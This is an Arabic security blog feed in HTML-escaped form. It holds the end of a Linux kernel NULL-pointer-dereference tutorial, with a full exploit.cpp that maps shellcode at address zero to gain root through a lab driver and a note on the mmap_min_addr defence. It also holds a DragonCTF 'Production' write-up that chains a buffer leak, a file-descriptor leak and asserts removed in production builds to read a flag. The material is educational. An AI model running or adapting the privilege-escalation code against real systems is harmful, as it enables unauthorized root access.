+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to get current task info.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* change privileges */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prepare_creds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Failed to prepare new credentials&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ENOMEM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;egid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;commit_creds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.cubieserver.de/2018/modify-process-credentials-in-linux-kernel/&quot;&gt;Jack’s Blog&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;الإستغلال-النهائي&quot;&gt;الإستغلال النهائي&lt;/h3&gt;
+
+&lt;p&gt;exploit.cpp&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pwned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+
+  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc0\xe8\xe9\x11\x08\xc5\xe8\x74\x0e\x08\xc5\xc3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;cm&quot;&gt;/**
+  
+  0:  31 c0                   xor    eax,eax
+  2:  e8 e9 11 08 c5          call   0xffffffffc50811f0
+  7:  e8 74 0e 08 c5          call   0xffffffffc5080e80
+  c:  c3                      ret
+
+  **/&lt;/span&gt;
+
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dev/wes4m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;O_RDWR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+  
+  &lt;span class=&quot;n&quot;&gt;mmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_EXEC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_READ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PROT_WRITE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAP_FIXED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;memcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+  
+  &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;  
+
+  &lt;span class=&quot;n&quot;&gt;pwned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;الحماية-من-الثغرة&quot;&gt;الحماية من الثغرة&lt;/h2&gt;
+
+&lt;p&gt;نظام Linux يحتوي على حماية مفعلة إفتراضيا &lt;code class=&quot;highlighter-rouge&quot;&gt;mmap_min_addr&lt;/code&gt; مهمتها منع عمليات الـ Userspace من حجز ذاكرة في العنوان NULL أو 0&lt;/p&gt;
+
+&lt;p&gt;أيضا من مهمة المبرمج التأكد من عدم تنفيد فنكشن بدون التأكد من أن العنوان صالح للإستخدام.&lt;/p&gt;
+
+&lt;h3 id=&quot;الختام&quot;&gt;الختام&lt;/h3&gt;
+
+&lt;p&gt;توجد مصادر كثيرة  وتقنيات عديدة جدآ ومختلفة وثغرات مكتشفة سابقآ بشروح مفصلة يمكنك البحث عنها.&lt;/p&gt;
+
+&lt;p&gt;بعض منها:&lt;/p&gt;
+
+&lt;p&gt;http://www.jackson-t.ca/lg-driver-lpe.html&lt;/p&gt;
+
+&lt;p&gt;https://0x00sec.org/t/kernel-exploitation-dereferencing-a-null-pointer/3850&lt;/p&gt;
+
+&lt;p&gt;https://www.abatchy.com/2018/01/kernel-exploitation-1&lt;/p&gt;
+
+&lt;p&gt;أرشيف مجموعة كبيرة : https://github.com/xairy/linux-kernel-exploitation&lt;/p&gt;</content><author><name></name></author><summary type="html">من اكثر الامثلة شيوعآ للإستخدام في هذا الموضوع هي مصطلحات مثل Android rooting, IOS Jailbreak ، فالكثير منا على إطلاع بها وبالغرض منها. ولكن هل تسائلت من قبل كيف تعمل في عمقها ؟</summary></entry><entry><title type="html">حل تحدي Production - DragonCTF</title><link href="http://localhost:4000/writeups/2018/10/08/productiondrgctf.html" rel="alternate" type="text/html" title="حل تحدي Production - DragonCTF" /><published>2018-10-08T04:51:01-07:00</published><updated>2018-10-08T04:51:01-07:00</updated><id>http://localhost:4000/writeups/2018/10/08/productiondrgctf</id><content type="html" xml:base="http://localhost:4000/writeups/2018/10/08/productiondrgctf.html">&lt;p&gt;من مشاركتي مع فريق &lt;a href=&quot;https://twitter.com/shellphish&quot;&gt;@Shellphish&lt;/a&gt;
+إنتهت المسابقة بحصول الفريق على المركز الأول وكان هذا أحد التحديات الممتعة 
+والمليئة بالمعلومات.&lt;/p&gt;
+
+&lt;p&gt;سأقوم بشرح لطريقة حل التحدي وشرح المعلومات المهمة في الحل&lt;/p&gt;
+
+&lt;p&gt;صورة من التحدي
+&lt;img src=&quot;/content/ProductionMain.jpg&quot; alt=&quot;ProductionMain&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;لمن ليس لديه معلومات ماهي تحديات CTF , Capture the flag هي طريقة ممتعة ومن أفضل الطرق بل أعتبرها في نظري من أهم الطرق في تعلم طرق الإختراق والهندسة العكسية والتشفير وغيرها من عمليات أساسية في الأمن السيبراني 
+لمعلومات أكثر يمكنك قراءة شرح ممتاز من &lt;a href=&quot;https://majdalsharif.github.io/CTF-guide/&quot;&gt;هنا&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;التحدي&quot;&gt;التحدي&lt;/h3&gt;
+&lt;p&gt;بداية أشجعك على محاولة حل التحدي بنفسك. الوقت المحدد للـ CTF قد إنتهى لكن السيرفر لازال يعمل من هنا&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lyrics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hackable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;software&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4141&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;في حال تعطل السيرفر أو إغلاقه ورغبتك في إكمال التحدي 
+يمكنك عمل كومبايل للكود بإستخدام g++ وتأكد من إضافة فلاق NDBG-
+ثم إستخدم netcat مع فلاق e- لتنفيذ الإتصال على جهازك&lt;/p&gt;
+
+&lt;h3 id=&quot;كود-التحدي&quot;&gt;كود التحدي&lt;/h3&gt;
+&lt;p&gt;lyrics.c&lt;/p&gt;
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/V8eFX4RH&quot; style=&quot;border:none;width:100%;height:900px&quot;&gt;&lt;/iframe&gt;
+&lt;h3 id=&quot;الحل&quot;&gt;الحل&lt;/h3&gt;
+&lt;p&gt;نبدأ بتجربة سريعة على السيرفر بناءَ على الأوامر الموجودة في الكود&lt;/p&gt;
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/PG7M7NvW&quot; style=&quot;border:none;width:100%;height: 500px&quot;&gt;&lt;/iframe&gt;
+&lt;p&gt;&lt;img src=&quot;/content/console.jpg&quot; alt=&quot;console&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;نلاحظ من تجربة عشوائية بأن طريقة عرض السيرفر للبيانات هي عبارة عن ملفات
+بحيث عند طلب عرض الفرق bands يقوم بعرض قائمة بالفرق والتي هي عبارة عن مجلدات
+وعند طلب قائمة الأغاني يقوم بسؤالك عن إسم الفرقة. في هذه الحالة هو فعليآ إسم المجلد لذلك عند وضع “..” مكان إسم الفرقة قام بعرض الملفات الموجودة بالخلف والتي بدورها تحتوي على ملف العلم&lt;/p&gt;
+
+&lt;p&gt;نلاحظ أيضا أن طريقة عمل الكود هي بفتح الملف ثم قراءته وعرض محتواه لذلك يتضح لنا أنه بإمكاننا قراءة ملف العلم وحل التحدي بكل بساطة&lt;/p&gt;
+
+&lt;p&gt;ولكن!
+&lt;img src=&quot;/content/whenOpenFlag.jpg&quot; alt=&quot;whenOpenFlag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;هذه نتيجة محاولة فتح ملف العلم
+بعد قراءة كود السيرفر عدة مرات بحثآ عن طريقة لقراءة العلم 
+نلاحظ وجود ثغرة تمكننا من تسريب بيانات من ملف آخر في الفنكشن التالي&lt;/p&gt;
+
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/bS4wQrbS&quot; style=&quot;border:none;width:100%;height:400px&quot;&gt;&lt;/iframe&gt;
+&lt;p&gt;يعمل السيرفر عن طريق قراءة سطر من كلمات إغنية محددة في كل مرة نقوم بإرسال أمر read ولكن عن وصوله لنهاية الملف ستقوم الفنكشن بإرجاع -1 وبدورها سنتمكن من إستغلال هذه النقطة في :&lt;/p&gt;
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/YnMN8SfZ&quot; style=&quot;border:none;width:100%;height:400px&quot;&gt;&lt;/iframe&gt;
+&lt;p&gt;تقوم الفنكشن بالتأكد من أن عدد البايتات التي تم قراءتها أكبر من صفر ثم التأكد من عدم وجود كلمة DrgnS في البيانات وهي جزء من العلم 
+بحيث حتى لو تمكنا من قراءة العلم ستوقفنا الفنكشن بمجرد قراءتها لهذه الكلمة وهذا عائق اخر. ولكن 
+اذا قمنا بقراءة أحد ملفات الأغاني الى ماقبل نهايته ثم قمنا بقراءة ملف العلم 
+ستقوم الفنكشن بوضع بايتات العلم في الذاكرة الموجودة buffer وستتوقف عند قراءتها لكلمة DrgnS لكن لن يتم إغلاق الإتصال
+بدورنا يمكننا بعد ذلك قراءة اخر سطر متبقي من الإغنية فستقوم الفنكشن بإرجاع -1 بدورها ستتجاوز شرط التأكد من الكلمة وستقوم بطباعة البفر بالكامل محتويا على بيانات سابقة بدون تصفير البفر uninitialized memory&lt;/p&gt;
+
+&lt;p&gt;يمكنك عمل كومبايل للكود وصنع ملف علم وهمي بإسم آخر للتأكد من أنك ستتمكن من قراءه بهذه الطريقة.
+الآن أصبح لدينا طريقة لقراءة العلم متجاوزين أحد العوائق وهي التأكد من كلمة DrgnS
+ولكن لازلنا عالقين. لأنه من الأساس لن نستطيع من فتح الملف flag لقراءة محتواه بسبب وجود شرط يوقفنا من ذلك&lt;/p&gt;
+
+&lt;p&gt;بحثآ عن طريقة لفتح الملف نلاحظ وجود حد أقصى لبعض الأمور في بداية الكود
+عن طريق دالة setrlimit
+وهي دالة مهمة في نظام لينكس تقوم بتحديد الريسورس المتوفرة لعملية محددة وتتحكم فيها النواة 
+لمعلومات أكثر 
+https://www.gnu.org/software/libc/manual/html_node/Limits-on-Resources.html&lt;/p&gt;
+
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/9jucTAje&quot; style=&quot;border:none;width:100%;height:400px&quot;&gt;&lt;/iframe&gt;
+&lt;p&gt;أهمها هوRLIMIT_NOFILE فهذا يضع حد أقصى لعدد الملفات التي يمكن للعملية فتحها
+يتم تحديد الحد بناءا على عدد الـ file descriptors (fd) المفتوحة وهو أمر سيتم شرحه لاحقآ في الموضوع
+ولكن يوجد حد أقصى آخر غير مرتبط بعدد الـ fd
+الحد الأقصى هنا هو 32 ولكن يوجد شرط آخر في الكود&lt;/p&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open_lyrics&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;c1&quot;&gt;// Don't allow opening too many lyrics at once.&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;records&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;هنا حد آخر يجعل الحد الأقصى ١٦ ملف فقط
+بعد بحث وتجربة عدة ثغرات وطرق للتمكن من فتح الملف نلاحظ وجود ثغرة هنا
+بحيث لو تمكنا من فتح ملف symbolic link سيتم فتحه وإظهار رسالة خطأ ولكن سيتم إعادة true بدون إغلاق الإتصال وأيضا لن يتم إغلاق الملف&lt;/p&gt;
+&lt;iframe src=&quot;https://pastebin.com/embed_iframe/bHX8y9Pv&quot; style=&quot;border:none;width:100%;height: 300px&quot;&gt;&lt;/iframe&gt;
+&lt;p&gt;في نظام لينكس هو ملف يقوم بإيصالك مباشرة بملف آخر 
+بنفس مبدأ ملفات shortcut في نظام وندوز symbolic link&lt;/p&gt;
+
+&lt;p&gt;يعمل نظام لينكس بمايسمى file descriptors 
+وهو رقم يتم وضعه لكل ملف تقوم العملية بفتحه عن طريق open ويمكنك تطبيق عمليات على ملف محدد عن طريق رقمه مثل read, write
+&lt;img src=&quot;/content/fd.jpg&quot; alt=&quot;fd&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;ومعاملة بعض أجزاء النظام كملفات هي جزء من فلسفة نظام لينكس 
+فأيضا عند بدء عملية مرتبطة بالترمنل tty في لينكس يقوم النظام بفتح ثلاث streams وتخزين file descriptors لكل واحد منهم
+وهم&lt;br /&gt;
+0: stdin
+1: stdout
+2: stderr
+فعند إستدعاء دالة read على الـ fd 0 هي بالضبط عملية إدخال بيانات من المستخدم للعملية
+وكذلك عند عمل write للـ fd 1 هي عملية إخراج أو طباعة بيانات للمستخدم من العملية.&lt;/p&gt;
+
+&lt;p&gt;بعد بحث مطول عن ملف symbolic link محاولين تنفيذ الثغرة لفتح ملف بدون إغلاقه
+لن تتمكن من الوصول لأي ملف على النظام نظرا لشروط تحبط عمليات الـ path 
+traversal
+مثل محاولات البحث عن طريق إستخدام “&quot; أو “ ..&quot; وغيرها
+وهي إستغلال مناسب في هذه الحالات نظرآ لأنه يتم وضع مدخلات المستخدم مع مسار الملف للوصل لمكان محدد 
+ولكن المبرمج هنا قام بالحماية من هذه الهجمات عن طريق عمل فنكشن يقوم بالتحقق من مدخلات المستخدم sanitize_path
+لذلك لابد من وجود طريق آخر&lt;/p&gt;
+
+&lt;p&gt;ماذا لو قمنا بتجاوز الحد الأقصى للمفات التي يمكننا فتحها 
+عند ذلك بكل تأكيد ستعيد الفنكشن فشل في فتح الملف وبذلك سيعتقد الشرط بأننا قمنا بمحاولة فتح ملف sym link
+ولكن يوجد شرط يقف في طريقنا فلن نتمكن من فتح ٣٢ ملف بسبب شرط الـ ١٦ ملف&lt;/p&gt;
+
+&lt;p&gt;فكيف يمكن تجاوزه ؟
+نلاحظ وجود بعض شروط الـ assertions في الكود
+وهي شروط يتم وضعها لعمل testing للكود في حالة الـ developemnt
+ولكن من قراءة وصف التحدي والإسم توجد تلميحة 
+فتنقسم عادة المشاريع البرمجية الى مرحلتين 
+developemt, production
+في وقت الـ production
+يقوم الكومبايل بحذف جميع شروط الـ assert&lt;/p&gt;
+
+&lt;p&gt;بذلك نحصل على ثغرة غير ملحوظة. فشرط الـ ١٦ ملف يقوم بالتأكد عن طريق قياس حجم الفيكتور الذي تقوم العملية بزيادته عند فتح كل ملف بشكل رسمي
+ولكن. لو تمكنا من فتح الملف بشكل غير رسمي عن طريق إستغلال ثغرة الـ assert 
+في أحد الشروط الموجودة سنتمكن من فتح أكثر من ١٦ ملف حتى يوقفنا شرط الـ ٣٢
+وتكمن هنا&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;globals&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;records&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;بنفس شرط فحص الملف لوجود DrgnS
+سيتم إغلاق الملف بداخل assert وطباعة الخطأ
+ولكن. بما أنه تم إصدار الملف بكومبايلر في حالة production
+سيتم حذف هذا السطر من الكود. مما يمكننا من فتح ملفات عدة بشرط إن يحتوي الملف على كلمة DrgnS ليتم تنفيذ هذه المنطقة من الكود&lt;/p&gt;
+
+&lt;p&gt;بعد بحث في جميع كلمات الأغاني الموجود فالسيرفر لن تجد أي ملف يحتوي على هذه الكلمة
+ولكن. يمكنك ملاحظة سورس السيرفر موجود وهو أيضا يحتوي على الكلمة DrgnS
+يمكنك فتح العملية مرات عدة ولكن ستلاحظ توقف السيرفر فجأة وذلك بسبب حد أقصى اخر
+وهو حجم المخرجات&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;rlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_cur&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rlim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rlim_max&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
